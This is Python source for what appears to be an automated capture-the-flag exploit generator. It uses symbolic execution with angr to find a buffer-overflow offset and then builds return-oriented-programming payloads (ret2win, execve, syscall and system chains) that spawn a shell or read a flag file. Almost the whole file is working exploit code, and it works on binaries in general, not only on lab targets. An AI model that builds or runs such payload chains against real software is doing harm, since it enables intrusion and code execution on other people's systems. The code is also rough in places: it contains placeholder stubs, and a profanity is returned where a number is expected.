from pwn import *
import angr, claripy
import subprocess

class ROP:
    def __init__(self, analysis, properties):
        self.analysis = analysis
        self.filename = analysis.binary
        self.properties = properties
        self.offset = Get2overflow(self.filename).buf()
        self.e = ELF(self.filename)
        self.gadgets = []

    def ret2win(self):
        payload = cyclic(self.offset)
        payload += p64(self.e.sym["win"])
        return payload

    def ret2execve(self):
        self.find_gadgets()         
        payload = cyclic(self.offset)
        payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        payload += p64(self.e.sym["execve"])

        return payload

    def ret2syscall(self):
        self.find_gadgets()
        payload = cyclic(self.offset)
        payload += self.fill_reg("rax", 59)
        payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += self.fill_reg("rdx", 0)
        payload += p64(self.e.sym["syscall"])
        
        return payload
    
    def ret2system(self):
        self.find_gadgets()
        payload = cyclic(self.offset)
        if self.analysis.has_catflagtxt():
            payload += self.fill_reg("rdi", self.analysis.get_catflagtxt())
        elif self.analysis.has_binsh():
            payload += self.fill_reg("rdi", self.analysis.get_binsh())
        payload += self.fill_reg("rsi", 0)
        payload += p64(self.e.sym["system"])

        return payload

    def supporting_functions_here(self): # ---------------------------------------------
        print("example support function")

    def find_gadgets(self):
        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | grep 0x"
        raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
            self.gadgets.append(i.replace(" nop;", ""))

    def get_gadgets(self):
        return self.gadgets

    def get_pops(self):
        pops = []
        for i in self.gadgets:
            pops.append(i) if "pop" in i else next
        return pops

    def num_pops(self, string):
        return string.count('pop')
    
    def pop_reg(self, reg):
        for i in self.get_pops():
            if ': pop ' + reg + "; ret;" in i:
                return [i.split(":")[0], 1]
            elif "pop " + reg in i:
                return [i.split(":")[0], self.num_pops(i)]
    
    def fill_reg(self, reg, val):
        chain = p64(int(self.pop_reg(reg)[0], 16))
        for i in range(self.pop_reg(reg)[1]):
            chain += p64(int(val))

        return chain



class Get2overflow:
    def __init__(s, binary):
        s.elf = context.binary =  ELF(binary)
        s.proj = angr.Project(binary)
        start_addr = s.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 1024
        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
        s.symbolic_padding = None

        s.state = s.proj.factory.blank_state(
                addr=start_addr,
                stdin=s.symbolic_input
        )
        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
        s.simgr.stashes["mem_corrupt"] = []

        s.simgr.explore(step_func=s.check_mem_corruption)

    def check_mem_corruption(s, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        s.symbolic_padding = stack_smash[:index]
                        simgr.stashes["mem_corrupt"].append(path)
                    except:
                        print("do a thing")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    def buf(s):
        try:
            return len(s.symbolic_padding)
        except:
            return "Fuck"
